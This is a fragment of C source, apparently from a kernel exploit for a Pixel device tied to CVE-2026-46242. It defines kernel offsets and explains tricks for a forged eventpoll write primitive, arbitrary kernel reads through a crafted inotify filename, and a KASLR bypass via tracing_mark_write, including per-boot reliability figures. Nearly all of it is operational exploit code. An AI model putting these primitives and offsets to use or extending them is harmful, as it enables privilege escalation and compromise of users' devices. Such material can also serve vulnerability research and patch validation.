...
// and the futex-hash collision check never matches.
...
#define EVENTPOLL_FOPS_OFF          0x0110bc70ULL   /* CVE-2026-46242 --wpoke: is_file_epoll target (derived from captured kallsyms; validated vs SYSTEM_UNBOUND_WQ_OFF) */
/* --wpoke write target: private_data = &<a self-empty list_head> - 0x60, so the
 * forged eventpoll's rdllist(+0x60) is that self-empty list. ptype_all is empty
 * on a device with no ETH_P_ALL sniffers; image_off 0x2010568, minus 0x60. Its
 * neighborhood this boot: mtx(-0x60)=0, lock(+0x10)=0, ws(+0x30)!=0 (tests
 * whether __pm_relax(ws) is on the epoll_wait poll path). byte-clean address. */
#define WPOKE_PRIV_OFF              0x02010508ULL   /* ptype_all - 0x60 */
...
/* CVE-2026-46242 arbitrary-read targets. The forged f_inode rides an inotify
 * filename, so f_inode = base + off - INODE_OFF_I_SB must contain no 0x00/0x2f
 * byte; a single fixed target is unclean on ~13% of boots (f_inode byte2 =
 * base bits 21-23). These are global list_heads spread across .data: .next is
 * always a valid kernel pointer (so the i_sb deref is safe) and +0x18 is mapped
 * (so i_ino is readable). The runtime scan picks the first byte-clean one,
 * cutting unclean boots to ~0.8% (the irreducible byte3 = base+0x02 case).
 * Link-time offsets from the Image's kallsyms (tools/pixel-image). */
#define AAR_TARGETS(X) 	X(0x020daa80ULL) /* super_blocks     */ 	X(0x020ad430ULL) /* modules          */ 	X(0x020b32a8ULL) /* cgroup_roots     */ 	X(0x0213bf60ULL) /* dpm_list         */ 	X(0x0210acb8ULL) /* crypto_alg_list  */ 	X(0x0211e730ULL) /* pci_root_buses   */ 	X(0x020d2f20ULL) /* vmap_area_list   */
...
// Write-free KASLR (cves/kaslr/README.md): tracing_mark_write stores its own
...
// stext = leaked_ip - SLIDE_TRACE_MARK_IP_OFF. Image offset of that IP from
// _text: tracing_mark_write@0x1f0964 + 0x164 = 0x1f0ac8 (harvested kallsyms).
